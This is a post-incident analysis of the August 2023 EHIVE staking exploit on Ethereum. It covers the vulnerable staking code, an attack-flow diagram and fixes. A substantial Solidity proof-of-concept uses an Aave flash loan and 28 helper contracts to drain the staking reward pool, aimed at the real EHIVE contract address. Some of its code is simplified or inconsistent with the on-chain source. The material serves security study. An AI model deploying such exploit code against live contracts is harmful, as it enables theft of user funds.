# EHIVE Staking Order Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | EHIVE |
| Date | 2023-08-28 |
| Chain | Ethereum Mainnet |
| Loss | ~$15,000 USD |
| Attack Type | Staking Order Manipulation (Staking Order Vulnerability) |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0x0195448a9c4adeaf27002c6051c949f3c3234bb5` |
| Attack Contract | `0x98c2e1e85f8bf737d9c1450dd26d4a4bf880b892` |
| Vulnerable Contract | `0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd` (EHIVE) |
| Fork Block | 17,690,497 |

## 2. Vulnerable Code Analysis

The EHIVE token's staking contract had a flaw in its reward calculation logic related to staking order and balance criteria. The attacker pre-deployed 28 UnstakeContracts, performed small initial stakes, then used a flash loan after simulating a 38-day time skip (vm.warp) to stake/unstake large amounts of EHIVE and manipulate rewards.

```solidity
// Vulnerable pattern: order dependency in staking reward calculation
contract EHIVEStaking {
    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public stakeTimestamp;
    uint256 public totalStaked;
    uint256 public rewardPool;

    // Vulnerable: reward calculated based on total staked amount at staking time
    function stake(uint256 amount) external {
        stakedAmount[msg.sender] += amount;
        stakeTimestamp[msg.sender] = block.timestamp;
        totalStaked += amount;
        EHIVE.transferFrom(msg.sender, address(this), amount);
    }

    // Vulnerable: disproportionate reward obtained by immediately unstaking after large stake
    function unstake(uint256 amount) external returns (uint256 reward) {
        // reward = (staked amount / total staked) * rewardPool
        // Manipulable via large short-term staking
        reward = stakedAmount[msg.sender] * rewardPool / totalStaked;
        stakedAmount[msg.sender] -= amount;
        totalStaked -= amount;
        EHIVE.transfer(msg.sender, amount + reward);
    }
}
```

**Vulnerability**: By pre-deploying multiple small-stake contracts (with time elapsed set) and staking a large amount of EHIVE via flash loan, the attacker's share of total staked increases sharply. Immediately unstaking then allows extraction of a disproportionately large reward from the reward pool.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: main.sol
    function isStaking(address stakerAddr, uint256 validator) public view returns (bool) {  // ❌
        return _stakers[stakerAddr][validator].staker == stakerAddr;
    }

// ...

    function stake(uint256 stakeAmount, uint256 validator) external isStakingEnabled {  // ❌
        require(totalSupply() <= maxSupply, "There are no more rewards left to be claimed.");

        // Check user is registered as staker
        if (isStaking(msg.sender, validator)) {  // ❌
            _stakers[msg.sender][validator].staked += stakeAmount;
            _stakers[msg.sender][validator].earned += _userEarned(msg.sender, validator);
            _stakers[msg.sender][validator].start = block.timestamp;
        } else {
            _stakers[msg.sender][validator] = Staker(msg.sender, block.timestamp, stakeAmount, 0);
        }

        validators[validator].staked += stakeAmount;
        totalStaked += stakeAmount;
        _burn(msg.sender, stakeAmount);
    }

// ...

    function claim(uint256 validator) external isStakingEnabled {  // ❌
        require(isStaking(msg.sender, validator), "You are not staking!?");  // ❌
        require(totalSupply() <= maxSupply, "There are no more rewards left to be claimed.");

        uint256 reward = userEarned(msg.sender, validator);

        _claimHistory[msg.sender].dates.push(block.timestamp);
        _claimHistory[msg.sender].amounts.push(reward);
        totalClaimed += reward;

        _mint(msg.sender, reward);

        _stakers[msg.sender][validator].start = block.timestamp;
        _stakers[msg.sender][validator].earned = 0;
    }

// ...

    function unstake(uint256 validator) external {
        require(isStaking(msg.sender, validator), "You are not staking!?");  // ❌

        uint256 reward = userEarned(msg.sender, validator);

        if (totalSupply().add(reward) < maxSupply && stakingEnabled) {  // ❌
            _claimHistory[msg.sender].dates.push(block.timestamp);
            _claimHistory[msg.sender].amounts.push(reward);
            totalClaimed += reward;

            _mint(msg.sender, _stakers[msg.sender][validator].staked.add(reward));
        } else {
            _mint(msg.sender, _stakers[msg.sender][validator].staked);
        }

        validators[validator].staked -= _stakers[msg.sender][validator].staked;
        totalStaked -= _stakers[msg.sender][validator].staked;

        delete _stakers[msg.sender][validator];
    }

// ...

    function setStakingState(bool onoff) external teamOROwner {  // ❌
        stakingEnabled = onoff;  // ❌
    }
```

## 3. Attack Flow

```
Attacker [0x0195448a9c4adeaf27002c6051c949f3c3234bb5]
  │
  ├─1─▶ Deploy 28 UnstakeContracts and call stake(0) with small amounts
  │      Each contract: IUnstake.stake(0)
  │      [Preparation phase]
  │
  ├─2─▶ vm.warp(block.timestamp + 38 days)
  │      Simulate 38 days elapsed (reward accumulation)
  │
  ├─3─▶ WETH.approve(AaveFlashloan, amount)
  │      [WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
  │
  ├─4─▶ AaveFlashloan.flashLoanSimple(WETH, amount)
  │      Borrow large amount of WETH via Aave V3 flash loan
  │
  ├─5─▶ executeOperation() callback:
  │      a) WETHToEHIVE() - swap WETH → EHIVE
  │      b) EHIVE.transfer(UnstakeContracts) - distribute
  │      c) IUnstake.unstake() × 27 - unstake from each contract
  │         → collect accumulated rewards
  │      d) EHIVEToWETH() - reverse swap EHIVE → WETH
  │
  └─6─▶ Repay Aave flash loan + realize ~$15,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IEHIVE is IERC20 {
    function stake(uint256 amount) external;
}

interface IUnstake {
    function stake(uint256 amount) external;
    function unstake() external returns (uint256);
}

interface IAaveFlashloan {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract UnstakeContract {
    IEHIVE ehive = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
    address owner;

    constructor() { owner = msg.sender; }

    function stake(uint256 amount) external {
        if (amount > 0) {
            ehive.transferFrom(msg.sender, address(this), amount);
        }
        ehive.stake(amount);
    }

    function unstake() external returns (uint256) {
        uint256 reward = ehive.unstake(ehive.balanceOf(address(this)));
        ehive.transfer(owner, ehive.balanceOf(address(this)));
        return reward;
    }
}

contract EHIVEExploit {
    IEHIVE EHIVE = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IAaveFlashloan aaveFlashloan;
    IUniswapV2Pair ehivePair;
    UnstakeContract[28] unstakeContracts;

    function testExploit() external {
        // Deploy 28 unstaking contracts and perform initial stakes
        for (uint i = 0; i < 28; i++) {
            unstakeContracts[i] = new UnstakeContract();
            unstakeContracts[i].stake(0);
        }

        // Simulate 38 days elapsed
        // vm.warp(block.timestamp + 38 days);

        WETH.approve(address(aaveFlashloan), type(uint256).max);
        aaveFlashloan.flashLoanSimple(address(this), address(WETH), 100 ether, "", 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external returns (bool) {
        // WETH → EHIVE
        WETHToEHIVE(amount);

        // Distribute EHIVE to unstaking contracts
        uint256 ehiveBalance = EHIVE.balanceOf(address(this));
        for (uint i = 0; i < 28; i++) {
            EHIVE.transfer(address(unstakeContracts[i]), ehiveBalance / 28);
        }

        // Unstake from each contract - collect accumulated rewards
        for (uint i = 0; i < 27; i++) {
            unstakeContracts[i].unstake();
        }

        // EHIVE → WETH reverse swap
        EHIVEToWETH();

        // Repay flash loan
        WETH.transfer(address(aaveFlashloan), amount + premium);
        return true;
    }

    function WETHToEHIVE(uint256 amount) internal { /* Uniswap V2 swap */ }
    function EHIVEToWETH() internal { /* Uniswap V2 swap */ }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | Staking Order Vulnerability, Reward Calculation Manipulation |
| Impact Scope | EHIVE Staking Reward Pool |
| Explorer | [Etherscan](https://etherscan.io/address/0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd) |

## 6. Security Recommendations

```solidity
// Fix 1: Enforce minimum staking duration
contract EHIVEStaking {
    uint256 public constant MIN_STAKE_DURATION = 7 days;
    mapping(address => uint256) public stakeTimestamp;

    function unstake(uint256 amount) external {
        require(
            block.timestamp >= stakeTimestamp[msg.sender] + MIN_STAKE_DURATION,
            "Minimum stake duration not met"
        );
        // Calculate and distribute rewards
    }
}

// Fix 2: Calculate rewards using time-weighted method
function calculateReward(address user) public view returns (uint256) {
    uint256 timeStaked = block.timestamp - stakeTimestamp[user];
    // Reward proportional to time (time-weighted, not simple ratio)
    return stakedAmount[user] * rewardRate * timeStaked / totalStaked;
}

// Fix 3: Restrict staking to EOA addresses only
function stake(uint256 amount) external {
    // Contract addresses cannot stake (EOA only)
    require(msg.sender.code.length == 0, "Contracts cannot stake");
    // ...
}

// Fix 4: Flash loan protection - prohibit staking and unstaking in same block
mapping(address => uint256) public lastStakeBlock;

function unstake(uint256 amount) external {
    require(block.number > lastStakeBlock[msg.sender] + 1, "Cannot unstake in same block");
    // ...
}
```

## 7. Lessons Learned

1. **Reward Snapshot Attack**: Calculating staking rewards as a "proportion at time of staking" allows an attacker to drain the reward pool via large short-term stakes. A time-weighted accumulation method must be used instead.
2. **Contract Staking Restrictions**: Attackers bypass restrictions by deploying multiple contracts to distribute staking across them. Only EOAs should be allowed to stake, or a contract whitelist should be maintained.
3. **Flash Loan + Time Manipulation Combination**: Attacks combining flash loans with time elapsed (vm.warp) are reproducible in test environments. Staking protocols need mechanisms to defend against this combination.
4. **Aave V3 Flash Loan Abuse**: Aave V3's `flashLoanSimple()` simplifies single-asset flash loans. Attacks exploiting this are increasing, so staking protocols must implement flash loan protection logic.